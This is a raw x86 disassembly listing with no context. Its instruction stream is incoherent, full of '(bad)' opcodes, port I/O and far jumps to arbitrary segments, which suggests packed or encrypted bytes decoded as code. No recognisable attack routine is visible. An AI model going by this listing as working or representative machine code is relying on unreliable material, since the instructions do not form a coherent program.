  415fd1:	cmp    esp,DWORD PTR [ecx+0x7f991228]
  415fd7:	fwait
  415fd8:	arpl   WORD PTR [ebp+0x49],bp
  415fdb:	bound  esi,QWORD PTR [esi-0x3a0dfcd9]
  415fe1:	add    edx,DWORD PTR [ebx]
  415fe3:	cmc    
  415fe4:	dec    eax
  415fe5:	jnp    0x415ffa
  415fe7:	cmp    al,0xe5
  415fe9:	outs   dx,DWORD PTR ds:[esi]
  415fea:	pop    ds
  415feb:	fidivr WORD PTR [si]
  415fee:	jno    0x416027
  415ff0:	jb     0x415fab
  415ff2:	inc    ecx
  415ff3:	aad    0x96
  415ff5:	xchg   esi,eax
  415ff6:	mov    ah,0x77
  415ff8:	dec    esi
  415ff9:	popf   
  415ffa:	or     BYTE PTR [edx],al
  415ffc:	imul   ebx,ebp,0x2f68e6a8
  416002:	out    0xa1,eax
  416004:	dec    esi
  416005:	push   es
  416006:	test   BYTE PTR [ecx-0x43c0ebea],ah
  41600c:	enter  0x6d12,0x39
  416010:	mov    ds:0xe85322e2,al
  416015:	jae    0x41605b
  416017:	cmp    BYTE PTR ds:0xd9ec9b9e,bl
  41601d:	repnz les edi,FWORD PTR [ebp+0x48]
  416021:	push   esp
  416022:	imul   ecx,DWORD PTR [ecx+0x64fb8cf2],0xffffffba
  416029:	or     eax,0xb7d9679d
  41602e:	ds hlt 
  416030:	sub    ah,ch
  416032:	jmp    0x3db6:0x527ec8d9
  416039:	paddd  mm2,QWORD PTR [esi]
  41603c:	xor    DWORD PTR [esi],ebp
  41603e:	and    al,0xd
  416040:	and    BYTE PTR [edi],dl
  416042:	pop    edi
  416043:	xor    eax,0x72739c
  416048:	int    0x12
  41604a:	sti    
  41604b:	xlat   BYTE PTR ds:[ebx]
  41604c:	cmp    BYTE PTR [ebp-0x2bbf7d61],ch
  416052:	pusha  
  416053:	and    eax,0x6011f77e
  416058:	jo     0x416031
  41605a:	in     al,dx
  41605b:	mov    al,ds:0x107381c9
  416060:	xchg   edi,eax
  416061:	sbb    al,0xf5
  416063:	and    al,BYTE PTR [eax-0x4d]
  416066:	push   es
  416067:	inc    ebx
  416068:	xor    BYTE PTR [eax],bh
  41606a:	sahf   
  41606b:	sbb    edx,DWORD PTR [ebp+0x457d1838]
  416071:	stos   DWORD PTR es:[edi],eax
  416072:	popa   
  416073:	hlt    
  416074:	cmp    eax,0x685ebcfe
  416079:	cwde   
  41607a:	xchg   ebx,eax
  41607b:	inc    edi
  41607c:	jmp    0x41600b
  41607e:	or     al,0x10
  416080:	div    ch
  416082:	adc    BYTE PTR [ebp+0x15],bh
  416085:	leave  
  416086:	js     0x416102
  416088:	lock cmp DWORD PTR [esi],esi
  41608b:	ins    BYTE PTR es:[edi],dx
  41608c:	ds mov edi,0xefa2588a
  416092:	mov    ah,BYTE PTR [edx-0x36]
  416095:	push   ebp
  416096:	test   eax,0xeb32f666
  41609b:	sahf   
  41609c:	jge    0x416050
  41609e:	scas   eax,DWORD PTR es:[edi]
  41609f:	pop    ecx
  4160a0:	popa   
  4160a1:	loope  0x4160c3
  4160a3:	gs retf 
  4160a5:	or     ecx,DWORD PTR [ebx-0x223a2e07]
  4160ab:	dec    esi
  4160ac:	jmp    0x416115
  4160ae:	out    dx,eax
  4160af:	ret    
  4160b0:	shl    BYTE PTR [edx-0x50d0c81f],0x56
  4160b7:	add    esp,eax
  4160b9:	es sbb eax,0xfbda6fb1
  4160bf:	lods   eax,DWORD PTR ds:[esi]
  4160c0:	pop    ebx
  4160c1:	add    dh,bh
  4160c3:	sbb    dl,BYTE PTR [edi+eax*8]
  4160c6:	aas    
  4160c7:	push   esi
  4160c8:	sbb    ch,BYTE PTR [eax-0x4ba7bfab]
  4160ce:	scas   al,BYTE PTR es:[edi]
  4160cf:	pop    ebx
  4160d0:	sbb    cl,dh
  4160d2:	inc    eax
  4160d3:	js     0x4160dc
  4160d5:	jl     0x4160f2
  4160d7:	mov    ds:0x438d287e,al
  4160dc:	sbb    BYTE PTR [ecx+0x57],0x72
  4160e0:	push   ds
  4160e1:	(bad)  
  4160e3:	pushf  
  4160e4:	xchg   edi,eax
  4160e5:	fstp   DWORD PTR [esi+eax*2]
  4160e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160e9:	fistp  DWORD PTR [edi]
  4160eb:	mov    cl,ah
  4160ed:	loope  0x4160da
  4160ef:	icebp  
  4160f0:	stc    
  4160f1:	popf   
  4160f2:	sub    eax,0xe10e8bac
  4160f7:	adc    eax,0x401bb540
  4160fc:	scas   al,BYTE PTR es:[edi]
  4160fd:	fild   DWORD PTR [eax+0x196b6586]
  416103:	mov    eax,DWORD PTR [ecx-0x5cb0ec67]
  416109:	inc    edi
  41610a:	mov    edx,DWORD PTR [edx+ecx*1+0x12]
  41610e:	pop    esp
  41610f:	xchg   eax,eax
  416111:	mov    esp,0x74e5891c
  416116:	sbb    ah,cl
  416118:	int    0xb8
  41611a:	call   0xc3ab:0xfdc3e2b4
  416121:	pushf  
  416122:	jno    0x416153
  416124:	ins    DWORD PTR es:[edi],dx
  416125:	mov    esi,0x9cca0ae2
  41612a:	mov    al,0xc7
  41612c:	jno    0x4160c8
  41612e:	scas   eax,DWORD PTR es:[edi]
  41612f:	in     eax,0x4e
  416131:	mov    dl,0xef
  416133:	out    0x4,al
  416135:	pop    esi
  416136:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416137:	mov    dl,0xe8
  416139:	xor    edi,ecx
  41613b:	mov    al,ds:0x679eda6a
  416140:	xchg   ebp,eax
  416141:	test   dh,bh
  416143:	retf   0xa972
  416146:	jne    0x41619a
  416148:	jae    0x416136
  41614a:	push   cs
  41614b:	fdiv   DWORD PTR [esi+0x1ddd02c9]
  416151:	jo     0x41619a
  416153:	pop    esi
  416154:	rol    BYTE PTR [edx],1
  416156:	mov    al,ds:0x5dd39610
  41615b:	in     eax,dx
  41615c:	pushf  
  41615d:	pop    eax
  41615e:	mov    al,0x18
  416160:	mov    ch,0xa1
  416162:	stos   DWORD PTR es:[edi],eax
  416163:	sbb    eax,ecx
  416165:	xchg   BYTE PTR [eax-0x20ca113],bh
  41616b:	cmp    BYTE PTR [edi],0xb1
  41616e:	mov    bp,0x6ee0
  416172:	xor    dh,bh
  416174:	inc    edx
  416175:	cld    
  416176:	or     eax,0x107ceb14
  41617b:	mov    eax,0x733692eb
  416180:	shl    BYTE PTR [ecx+0x1a],1
  416183:	gs xor al,0x87
  416186:	scas   eax,DWORD PTR es:[edi]
  416187:	mov    ch,0xb2
  416189:	pop    es
  41618a:	push   es
  41618b:	xchg   ecx,eax
  41618c:	cmp    ah,BYTE PTR [eax]
  41618e:	mov    edx,0xc64e3912
  416193:	pop    ecx
  416194:	(bad)  
  416195:	push   cs
  416196:	mov    ah,0xce
  416198:	cli    
  416199:	jmp    0x2e5e8c56
  41619e:	pop    gs
  4161a0:	cmp    al,0x32
  4161a2:	push   edi
  4161a3:	rcr    DWORD PTR [ecx],0x3a
  4161a6:	push   edi
  4161a7:	pop    ebx
  4161a8:	add    ecx,0x7f
  4161ab:	pushf  
  4161ac:	mov    eax,0xe087ed08
  4161b1:	adc    BYTE PTR [eax-0x34],ah
  4161b4:	xchg   ecx,eax
  4161b5:	in     eax,dx
  4161b6:	jp     0x416184
  4161b8:	neg    cl
  4161ba:	mov    ebx,0x44684cd5
  4161bf:	ret    
  4161c0:	pop    eax
  4161c1:	stc    
  4161c2:	jl     0x41616f
  4161c4:	jns    0x416237
  4161c6:	xchg   ebx,eax
  4161c7:	(bad)
  4161ca:	fs cmc 
  4161cc:	mov    ds:0x3bbadf7b,al
  4161d1:	mov    BYTE PTR [eax+0xe],al
  4161d4:	call   0x9f67:0x14992a9a
  4161db:	push   es
  4161dc:	and    al,0xe5
  4161de:	add    al,0x94
  4161e0:	std    
  4161e1:	(bad)  
  4161e2:	(bad)  
  4161e3:	(bad)  
  4161e4:	mov    cl,cl
  4161e6:	dec    ebx
  4161e7:	pop    esp
  4161e8:	stos   BYTE PTR es:[edi],al
  4161e9:	push   ecx
  4161ea:	jp     0x416175
  4161ec:	sbb    edx,DWORD PTR [esi+0x534000cb]
  4161f2:	push   ecx
  4161f3:	scas   eax,DWORD PTR es:[edi]
  4161f4:	inc    ebx
  4161f5:	mov    ds:0xbd39d999,al
  4161fa:	sbb    al,0xed
  4161fc:	pop    edi
  4161fd:	ins    BYTE PTR es:[edi],dx
  4161fe:	add    edx,DWORD PTR [edi+0x32]
  416201:	inc    ecx
  416202:	jb     0x41626c
  416204:	test   DWORD PTR [edx+0x61],esi
  416207:	dec    edx
  416208:	jmp    0x54905136
  41620d:	and    BYTE PTR [edx],bh
  41620f:	xchg   ecx,eax
  416210:	dec    edi
  416211:	std    
  416212:	adc    eax,0x81c88812
  416217:	inc    BYTE PTR [esi+0x3b]
  41621a:	xor    ch,BYTE PTR [edi+eiz*2+0x56419e75]
  416221:	leave  
  416222:	add    ah,ch
  416224:	jmp    0x5526:0x6bbcf984
  41622b:	loop   0x41622e
  41622d:	je     0x41620b
  41622f:	xor    DWORD PTR [esi-0x3e11a47a],edi
  416235:	fisub  WORD PTR [ecx+0x4358c756]
  41623b:	test   DWORD PTR [edx-0x6],esp
  41623e:	mov    ebx,0xcd98e3a7
  416243:	sub    BYTE PTR [edx-0x2537fa35],ah
  416249:	and    cl,BYTE PTR [ebx]
  41624b:	shl    DWORD PTR [ebp+edi*2-0x24f7fe52],0x4a
  416253:	cs aas 
  416255:	sbb    BYTE PTR [eax],bh
  416257:	sub    esp,DWORD PTR [edx-0x75d03d65]
  41625d:	xor    DWORD PTR ss:[edx-0x4ae5d1e3],edx
  416264:	or     esi,DWORD PTR [edx-0x49]
  416267:	daa    
  416268:	cmp    esi,esp
  41626a:	aad    0x73
  41626c:	dec    ecx
  41626d:	ins    DWORD PTR es:[edi],dx
  41626e:	mov    ebp,0xd8a4a032
  416273:	inc    edi
  416274:	jge    0x416294
  416276:	mov    cs,WORD PTR [eax+0x39f1fc4c]
  41627c:	dec    ecx
  41627d:	out    dx,eax
  41627e:	es xor al,0xb4
  416281:	xor    eax,0xc0d836b5
  416286:	test   BYTE PTR [edx+0x5fffdd55],al
  41628c:	imul   ebp,edi,0xffffffca
  41628f:	inc    ebp
  416290:	(bad)  
  416291:	jmp    0x4162a5
  416293:	jmp    0x83df:0xaf807be5
  41629a:	sbb    al,BYTE PTR [ecx]
  41629c:	add    BYTE PTR [ebx+eax*1+0x8],0x8f
  4162a1:	daa    
  4162a2:	jbe    0x41630f
  4162a4:	cdq    
  4162a5:	ret    0xebc2
  4162a8:	fidiv  DWORD PTR [eax-0x3c]
  4162ab:	stos   DWORD PTR es:[edi],eax
  4162ac:	pop    edi
  4162ad:	sub    DWORD PTR [ebx*8-0x6437ea8e],edi
  4162b4:	and    ch,BYTE PTR [ebp-0x59]
  4162b7:	adc    ecx,eax
  4162b9:	in     al,0x3d
  4162bb:	out    dx,eax
  4162bc:	pop    ds
  4162bd:	mov    eax,ds:0x239eafda
  4162c2:	imul   eax,DWORD PTR [ebp+esi*2+0x11],0xffffff93
  4162c7:	jae    0x416326
  4162c9:	cmp    al,0xf7
  4162cb:	dec    ebx
  4162cc:	mov    es,WORD PTR [ebx]
  4162ce:	mov    bh,0xeb
  4162d0:	div    ecx
  4162d2:	push   ebp
  4162d3:	je     0x4162f6
  4162d5:	es cmc 
  4162d7:	pop    edi
  4162d8:	jae    0x416295
  4162da:	es test al,0x1c
  4162dd:	(bad)
  4162e0:	fadd   DWORD PTR [ecx+0x5ff6ab5b]
  4162e6:	nop
  4162e7:	or     BYTE PTR [esi],0xa8
  4162ea:	adc    al,0x47
  4162ec:	mov    cl,0xff
  4162ee:	fadd   DWORD PTR [ebx+0x72e134a0]
  4162f4:	mov    esi,ss
  4162f6:	ins    BYTE PTR es:[edi],dx
  4162f7:	and    BYTE PTR [esi-0x23777a98],ch
  4162fd:	not    BYTE PTR [ebx-0x35f8ae69]
  416303:	push   eax
  416304:	cmp    esp,DWORD PTR [ebp+0x30]
  416307:	(bad)  
  416308:	xor    edi,DWORD PTR [eax]
  41630a:	push   eax
  41630b:	lahf   
  41630c:	fcom   DWORD PTR [eax]
  41630e:	mov    ds:0xae2d0254,al
  416313:	sub    DWORD PTR [eax-0x28],edx
  416316:	xor    eax,0x33802276
  41631b:	pop    es
  41631c:	add    BYTE PTR [edi+0x12],ch
  41631f:	repz adc eax,0x501827df
  416325:	out    0xf8,al
  416327:	enter  0xed72,0x7f
  41632b:	cmp    BYTE PTR [esi+0x2b],cl
  41632e:	retf   
  41632f:	mov    DWORD PTR [ebp+0x63],esp
  416332:	push   ecx
  416333:	fwait
  416334:	nop
  416335:	add    ch,BYTE PTR [edx-0x2e7349c0]
  41633b:	xchg   esp,eax
  41633c:	add    al,0xed
  41633e:	shr    dl,cl
  416340:	or     eax,0xdf4acb85
  416345:	(bad)  
  416346:	pusha  
  416347:	adc    eax,0x49452fdb
  41634c:	pop    esi
  41634d:	and    eax,edi
  41634f:	push   eax
  416350:	push   ebx
  416351:	call   0x34f1:0xb19e3a1c
  416358:	jp     0x4163b7
  41635a:	leave  
  41635b:	adc    bh,bh
  41635d:	mov    ds,edi
  41635f:	sub    BYTE PTR [ebx-0x190817e4],0x53
  416366:	shr    DWORD PTR [eax-0x45313e0c],0x86
  41636d:	jo     0x4163d5
  41636f:	pop    eax
  416370:	add    cl,BYTE PTR [eax-0x6d596289]
  416376:	clc    
  416377:	ror    BYTE PTR ds:0x1b9d4d73,cl
  41637d:	push   ecx
  41637e:	fsub   QWORD PTR [ebp-0x5e63f46e]
  416384:	fisub  DWORD PTR [edx+esi*1]
  416387:	(bad)  
  416388:	addr16 dec ebp
  41638a:	xor    DWORD PTR [ebx-0x2c],edi
  41638d:	popa   
  41638e:	fwait
  41638f:	cmp    DWORD PTR [esi],eax
  416391:	jmp    0x30b1:0xd08910bc
  416398:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416399:	jb     0x416416
  41639b:	push   es
  41639c:	retf   0x97b
  41639f:	icebp  
  4163a0:	fcmovu st,st(0)
  4163a2:	pop    ebp
  4163a3:	push   esp
  4163a4:	mov    cl,0x8d
  4163a6:	sbb    eax,0xb6ed35fb
  4163ab:	mov    bl,0x5
  4163ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4163ae:	inc    edx
  4163af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163b0:	mov    al,0xfa
  4163b2:	cmc    
  4163b3:	mov    ch,0xda
  4163b5:	cmp    eax,0x7c37d9cf
  4163ba:	mov    eax,0xd451a3bf
  4163bf:	ror    DWORD PTR [edi-0x67],0x6f
  4163c3:	or     DWORD PTR ds:0x585b42a,0x2
  4163ca:	or     eax,DWORD PTR ds:0x4ff852b0
  4163d0:	dec    ebx
  4163d1:	cmp    BYTE PTR [edi],bh
  4163d3:	(bad)  
  4163d4:	jno    0x4163e7
  4163d6:	pop    edx
  4163d7:	pop    eax
  4163d8:	push   edx
  4163d9:	lods   eax,DWORD PTR ds:[esi]
  4163da:	or     al,0xca
  4163dc:	xchg   ebp,eax
  4163dd:	maskmovq mm5,mm6
  4163e0:	cmp    al,0x20
  4163e2:	call   0x864c:0x1c795c71
  4163e9:	sbb    al,0xfe
  4163eb:	std    
  4163ec:	mov    ebp,0x6dd4ce16
  4163f1:	icebp  
  4163f2:	pop    esp
  4163f3:	stos   BYTE PTR es:[edi],al
  4163f4:	xor    al,0x98
  4163f6:	scas   eax,DWORD PTR es:[edi]
  4163f7:	pop    ebp
  4163f8:	mov    ebp,0xb36c0ff2
  4163fd:	not    eax
  4163ff:	(bad)  
  416400:	shr    BYTE PTR [ebp-0x559d0a1e],1
  416406:	mov    ds:0x98335eb7,eax
  41640b:	sub    edi,0x70
  41640e:	add    eax,0xd449e03b
  416413:	lods   eax,DWORD PTR ds:[esi]
  416414:	rcr    bh,cl
  416416:	shl    DWORD PTR [ebx-0xf40da75],0xde
  41641d:	das    
  41641e:	cmp    ebp,DWORD PTR [ebx]
  416420:	daa    
  416421:	cld    
  416422:	leave  
  416423:	cmp    al,0xba
  416425:	xchg   BYTE PTR [ebp+0x159fe890],dl
  41642b:	sub    ch,BYTE PTR [edx+0x22b8a322]
  416431:	mov    ebp,0xfe42487e
  416436:	and    al,BYTE PTR [esi+0x73]
  416439:	sub    eax,0xbedd841b
  41643e:	loop   0x41643d
  416440:	sbb    BYTE PTR [ebx+0x3c],dl
  416443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416444:	les    ebp,FWORD PTR [ebx-0x4]
  416447:	inc    edi
  416448:	xchg   ebp,eax
  416449:	fwait
  41644a:	mov    ds:0x268328f6,al
  41644f:	pop    ecx
  416450:	dec    esp
  416451:	sahf   
  416452:	loope  0x416475
  416454:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416455:	(bad)  
  416456:	mov    esi,0x8d99fcd6
  41645b:	add    bh,ah
  41645d:	std    
  41645e:	gs sub dh,BYTE PTR fs:[edx]
  416462:	rol    al,0x3e
  416465:	jle    0x416456
  416467:	aad    0x91
  416469:	ret    0x8cb
  41646c:	jbe    0x416476
  41646e:	shl    BYTE PTR gs:[ebx],cl
  416471:	popa   
  416472:	fisubr DWORD PTR [esi-0x50]
  416475:	add    eax,0x2e9ad7a6
  41647a:	fwait
  41647b:	pop    ebp
  41647c:	jbe    0x41640e
  41647e:	xchg   BYTE PTR ds:0x75fafe4c,dl
  416484:	adc    cl,dh
  416486:	in     eax,0x27
  416488:	pop    esi
  416489:	pusha  
  41648a:	rcl    DWORD PTR [ebx+edx*2+0x6a],1
  41648e:	mov    esi,0xc0cbeece
  416493:	xchg   ecx,eax
  416494:	dec    esp
  416495:	fild   WORD PTR [ebp-0x68]
  416498:	and    DWORD PTR [esp+ebp*8+0x730a3e1d],esi
  41649f:	sahf   
  4164a0:	cmp    al,0x7a
  4164a2:	out    0x4,al
  4164a4:	out    0x83,eax
  4164a6:	and    eax,DWORD PTR [eax]
  4164a8:	lods   al,BYTE PTR ds:[esi]
  4164a9:	ds mov bh,0xa
  4164ac:	fwait
  4164ad:	jge    0x4164be
  4164af:	adc    DWORD PTR [ebx+0x6c9a4c6d],eax
  4164b5:	pushf  
  4164b6:	inc    edi
  4164b7:	loopne 0x41650d
  4164b9:	xor    esp,DWORD PTR [edx+0x26]
  4164bc:	loopne 0x416487
  4164be:	xchg   BYTE PTR [edi+0x29cb5e38],al
  4164c4:	popf   
  4164c5:	stc    
  4164c6:	sub    eax,0xc100baf
  4164cb:	into   
  4164cc:	dec    ebp
  4164cd:	rcr    BYTE PTR [eax],cl
  4164cf:	lock in al,0xa2
  4164d2:	repnz mov edi,0xb4e504de
  4164d8:	test   al,0x7a
  4164da:	arpl   dx,di
  4164dc:	xor    edx,DWORD PTR [edi+0xa7a704a]
  4164e2:	mov    ecx,0x8905e08d
  4164e7:	inc    esi
  4164e8:	lds    eax,FWORD PTR ds:[ecx]
  4164eb:	dec    ebx
  4164ec:	cmp    al,0x20
  4164ee:	not    DWORD PTR ds:0xeccbae16
  4164f4:	pop    ebx
  4164f5:	out    0x97,eax
  4164f7:	jp     0x4164b5
  4164f9:	int    0xe2
  4164fb:	push   eax
  4164fc:	adc    DWORD PTR [ebp+0x5e],ebp
  4164ff:	cmp    BYTE PTR ds:0x5ac122df,bh
  416505:	lods   eax,DWORD PTR ds:[esi]
  416506:	aas    
  416507:	inc    ecx
  416508:	sub    ebx,ecx
  41650a:	jo     0x416500
  41650c:	mov    ebx,0xae33e206
  416511:	mov    ah,0x68
  416513:	mov    al,0x38
  416515:	(bad)  
  416516:	lods   al,BYTE PTR ds:[esi]
  416517:	sbb    DWORD PTR [edi],esp
  416519:	jecxz  0x416520
  41651b:	xor    eax,0xf574fcb4
  416520:	xchg   BYTE PTR [ebx+0x29],dl
  416523:	les    ebx,FWORD PTR ds:0x2bddf9a2
  416529:	ret    0x622f
  41652c:	mov    edi,0xe17d79ec
  416531:	stos   DWORD PTR es:[edi],eax
  416532:	sub    eax,0x7c9efab4
  416537:	xchg   BYTE PTR [ecx],ah
  416539:	out    dx,al
  41653a:	and    BYTE PTR [edi+ebp*1+0x42b4854c],ah
  416541:	aaa    
  416542:	push   ss
  416543:	outs   dx,BYTE PTR ds:[esi]
  416544:	xchg   esp,eax
  416545:	cs push esp
  416547:	sub    al,dl
  416549:	retf   0xc7dd
  41654c:	pop    ecx
  41654d:	ins    BYTE PTR es:[edi],dx
  41654e:	pop    ebp
  41654f:	sub    dh,0x4d
  416552:	jb     0x4165c4
  416554:	inc    edx
  416555:	daa    
  416556:	pop    esi
  416557:	push   eax
  416558:	mov    cs,WORD PTR [ecx]
  41655a:	and    ah,ch
  41655c:	mov    ebx,0xf9fc9619
  416561:	adc    al,0xd9
  416563:	pushf  
  416564:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416565:	mov    dx,0x302b
  416569:	imul   eax,DWORD PTR [eax+0x41],0x97bcf598
  416570:	loopne 0x41655b
  416572:	jp     0x4164f7
  416574:	jmp    0x4165f3
  416576:	(bad)  
  416577:	das    
  416578:	adc    DWORD PTR ds:0x74c71493,0x7a
  41657f:	aaa    
  416580:	fcom   QWORD PTR [ecx+0x4c]
  416583:	lods   eax,DWORD PTR ds:[esi]
  416584:	(bad)  es:[eax]
  416588:	(bad)  
  416589:	cwde   
  41658a:	pop    es
  41658b:	xor    eax,0x8a2ae8af
  416590:	xor    BYTE PTR [edi],bh
  416592:	mov    dl,0x3f
  416594:	mov    dl,0x19
  416596:	jg     0x4165c5
  416598:	mov    DWORD PTR [edx+0x554fad42],0x8c469309
  4165a2:	out    dx,al
  4165a3:	fwait
  4165a4:	mov    dl,0x9c
  4165a6:	loop   0x416579
  4165a8:	sub    ecx,edi
  4165aa:	scas   al,BYTE PTR es:[edi]
  4165ab:	out    0xc8,eax
  4165ad:	pop    ebp
  4165ae:	pop    ss
  4165af:	cld    
  4165b0:	retf   
  4165b1:	add    al,0xc6
  4165b3:	pop    esp
  4165b4:	es in  al,dx
  4165b6:	add    BYTE PTR [edx-0x5862ca85],al
  4165bc:	xchg   ecx,eax
  4165bd:	jns    0x4165b5
  4165bf:	ins    DWORD PTR es:[edi],dx
  4165c0:	enter  0x2f0e,0x2a
  4165c4:	xchg   esp,eax
  4165c5:	xor    al,BYTE PTR [esi+0x5]
  4165c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165c9:	push   0x75
  4165cb:	jae    0x4165c8
  4165cd:	xor    esi,0xa2c62268
  4165d3:	call   0x4028ce39
  4165d8:	ss push ss
  4165da:	push   eax
  4165db:	ret    0x97b4
  4165de:	add    eax,0x23287a34
  4165e3:	je     0x4165e4
  4165e5:	lods   eax,DWORD PTR ds:[esi]
  4165e6:	pop    ds
  4165e7:	fwait
  4165e8:	aas    
  4165e9:	pcmpgtw mm2,QWORD PTR [edx]
  4165ec:	ret    0xb22e
  4165ef:	and    al,0xd2
  4165f1:	mov    BYTE PTR [eax+0x6],ch
  4165f4:	and    eax,esp
  4165f6:	cmovle edi,DWORD PTR [ebp+0x21]
  4165fa:	or     eax,0x4a5b5a96
  4165ff:	adc    eax,0xfb2960cc
  416604:	int3   
  416605:	jecxz  0x4165f0
  416607:	int    0xb5
  416609:	mov    WORD PTR [esi],es
  41660b:	and    eax,0xb2a9842d
  416610:	and    eax,DWORD PTR [edx+0x32]
  416613:	call   0x9d5e:0x239e5b7c
  41661a:	sbb    eax,DWORD PTR [ebp-0x7]
  41661d:	call   FWORD PTR [edx-0x2d98a50d]
  416623:	mov    dl,ah
  416625:	jb     0x416649
  416627:	imul   edx,DWORD PTR [ebx+esi*2-0x651e2bd7],0x3e
  41662f:	dec    esp
  416630:	outs   dx,DWORD PTR ds:[esi]
  416631:	adc    ebp,DWORD PTR [edi+0x61d06b6b]
  416637:	sub    DWORD PTR [eax+0x6c],ebx
  41663a:	arpl   si,sp
  41663c:	or     dh,BYTE PTR [edi+0x71]
  41663f:	add    bh,BYTE PTR [eax+esi*1+0x78af9419]
  416646:	arpl   WORD PTR [edi-0x29a2fad7],bp
  41664c:	loop   0x416697
  41664e:	into   
  41664f:	(bad)  
  416651:	jno    0x416660
  416653:	inc    eax
  416654:	sub    DWORD PTR [esi+0x6899f53],esi
  41665a:	neg    DWORD PTR [ebx]
  41665c:	mov    ds:0x8e6f8fd0,al
  416661:	push   edi
  416662:	leave  
  416663:	inc    eax
  416664:	push   0x1518ec53
  416669:	shr    edx,cl
  41666b:	cmp    BYTE PTR [eax+0x45],0x86
  41666f:	xchg   edx,eax
  416670:	(bad)  
  416671:	push   edi
  416672:	scas   al,BYTE PTR es:[edi]
  416673:	das    
  416674:	push   esp
  416675:	int    0x3
  416677:	outs   dx,DWORD PTR ds:[esi]
  416678:	out    0x9f,eax
  41667a:	push   0x479ecfd1
  41667f:	mov    dh,0x7d
  416681:	pop    edx
  416682:	and    al,0x10
  416684:	test   eax,0xed2adc28
  416689:	push   cs
  41668a:	and    al,0xf1
  41668c:	add    al,0x33
  41668e:	jp     0x4166ef
  416690:	xor    eax,0x164f81ea
  416695:	js     0xca1d99e0
  41669b:	cmp    BYTE PTR [ebx+edx*2+0x2f],cl
  41669f:	mov    cl,0x2c
  4166a1:	sbb    eax,DWORD PTR [edi+0x41]
  4166a4:	jp     0x4166ba
  4166a6:	jae    0x416647
  4166a8:	mov    al,0xda
  4166aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166ab:	(bad)  [ebx+ecx*4+0x1c5064b2]
  4166b2:	rcl    DWORD PTR es:[ebx+0x5cae2d1],0xc6
  4166ba:	mov    ecx,0xe19e68c5
  4166bf:	stos   DWORD PTR es:[edi],eax
  4166c0:	loop   0x4166fd
  4166c2:	xchg   edi,eax
  4166c3:	pop    ebx
  4166c4:	jmp    0xec210676
  4166c9:	mov    bl,0x40
  4166cb:	aas    
  4166cc:	into   
  4166cd:	mov    ebx,0x96356e37
  4166d2:	or     al,0x5
  4166d4:	js     0x416738
  4166d6:	push   0x3d026805
  4166db:	pop    esi
  4166dc:	pop    ds
  4166dd:	mov    eax,0xffa2868a
  4166e2:	xchg   esi,eax
  4166e3:	shl    ecx,cl
  4166e5:	mov    edx,0x352b46ab
  4166ea:	in     eax,0x7d
  4166ec:	arpl   dx,di
  4166ee:	test   BYTE PTR [eax+0x14],ah
  4166f1:	pop    ecx
  4166f2:	rcl    BYTE PTR [edx+ecx*8-0x48],0x97
  4166f7:	mov    al,0x87
  4166f9:	xor    BYTE PTR ds:[edx-0x420823f3],ah
  416700:	aaa    
  416701:	aad    0x89
  416703:	test   BYTE PTR [ecx+0x369957a0],0x12
  41670a:	sub    BYTE PTR [ebx],0xea
  41670d:	int    0xa3
  41670f:	nop
  416710:	and    ch,bl
  416712:	inc    ebp
  416713:	push   es
  416714:	dec    ebp
  416715:	inc    esi
  416716:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416717:	sbb    BYTE PTR [edx],cl
  416719:	mov    ch,0x8c
  41671b:	push   ecx
  41671c:	lods   al,BYTE PTR ds:[esi]
  41671d:	(bad)  
  41671e:	jle    0x416770
  416720:	mov    ebp,0xc7062950
  416725:	xchg   esi,eax
  416726:	xor    al,0xa0
  416728:	frstor [ebx+0x69]
  41672b:	push   edi
  41672c:	push   ecx
  41672d:	mov    cs,WORD PTR [edx+ebp*2+0x497345e1]
  416734:	adc    bl,al
  416736:	in     al,0x19
  416738:	adc    cl,BYTE PTR [edi-0xb6bdbad]
  41673e:	mov    DWORD PTR [edi+esi*4+0x31d7bfa2],ebx
  416745:	cs mov esp,0x400655b5
  41674b:	sub    dh,BYTE PTR [edx+0x1d9f1f38]
  416751:	xchg   edx,eax
  416752:	fs out dx,al
  416754:	sahf   
  416755:	xlat   BYTE PTR ds:[ebx]
  416756:	repnz adc DWORD PTR [ebx],ecx
  416759:	call   0x77ce:0x9acc66ed
  416760:	nop
  416761:	push   ss
  416762:	jne    0x41679f
  416764:	sub    eax,DWORD PTR [ecx+ebx*4+0x62da92f9]
  41676b:	sbb    DWORD PTR [esi+ebp*8+0x46e0df05],esi
  416772:	push   ss
  416773:	cli    
  416774:	or     ch,BYTE PTR [ebx-0x7e0e90aa]
  41677a:	mov    esi,0x8b67b7d7
  41677f:	jb     0x4167a3
  416781:	jl     0x4167c1
  416783:	sti    
  416784:	xchg   edx,eax
  416785:	cld    
  416786:	gs inc ebx
  416788:	push   edx
  416789:	lea    eax,[eax+0x52646763]
  41678f:	out    dx,eax
  416790:	sub    eax,0x1e4614f8
  416795:	ds adc al,al
  416798:	mov    edi,0x4ef941f
  41679d:	adc    ch,BYTE PTR [edx-0x2a]
  4167a0:	jg     0x416788
  4167a2:	sbb    al,0x8c
  4167a4:	dec    eax
  4167a5:	in     eax,dx
  4167a6:	sbb    edx,DWORD PTR [esi-0x7dcb3d3b]
  4167ac:	into   
  4167ad:	pop    ebx
  4167ae:	jmp    0xd3b5efce
  4167b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167b4:	or     cl,BYTE PTR [edx]
  4167b6:	es test al,0x8a
  4167b9:	test   DWORD PTR [edx],edx
  4167bb:	mov    dl,0x26
  4167bd:	hlt    
  4167be:	cmp    DWORD PTR [edx-0x7f],ebp
  4167c1:	ret    0x624c
  4167c4:	jecxz  0x416801
  4167c6:	rcl    DWORD PTR [esi+ebp*8],cl
  4167c9:	jmp    0x41680a
  4167cb:	dec    ebp
  4167cc:	xor    BYTE PTR [ebp-0x5c],bh
  4167cf:	push   ecx
  4167d0:	dec    esp
  4167d1:	lahf   
  4167d2:	jecxz  0x4167e4
